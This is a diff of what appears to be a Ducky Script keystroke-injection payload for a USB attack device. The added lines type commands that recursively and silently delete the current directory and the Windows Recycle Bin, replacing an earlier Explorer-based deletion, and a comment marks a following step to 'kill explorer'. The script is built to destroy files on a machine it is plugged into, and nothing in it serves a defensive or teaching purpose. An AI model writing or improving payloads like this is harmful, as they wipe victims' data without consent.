@@ -14,15 +14,13 @@ DELAY 1
 STRING rmdir /s /q .
 ENTER
 DELAY 125
+STRING cd C:\$Recycle.bin
+DELAY 25
+STRING rmdir /s /q .
+ENTER
+DELAY 125
 ALT F4
 DELAY 25
-WINDOWS e
-DELAY 75
-CTRL l
-STRING C:\$Recycle.bin
-CTRL a
-DELETE
-DELAY 500
 REM ---------------------------------------------------------------------------------------------------------------------------------
 REM kill explorer!
 REM ---------------------------------------------------------------------------------------------------------------------------------
